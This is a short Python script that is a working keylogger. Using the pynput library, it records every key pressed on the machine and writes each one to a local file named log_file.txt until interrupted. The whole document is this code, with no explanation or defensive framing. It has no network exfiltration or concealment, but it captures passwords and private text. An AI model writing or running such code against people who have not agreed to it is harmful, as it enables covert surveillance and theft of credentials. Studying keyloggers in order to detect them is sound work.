#!/usr/bin/env python3

from pynput.keyboard import Key, Listener
import logging
import sys

log_file = 'log_file.txt'

def keyboard_event(key):
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
    logging.info(str(key))

def main():
    with Listener(on_press=keyboard_event) as listener:
        listener.join()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
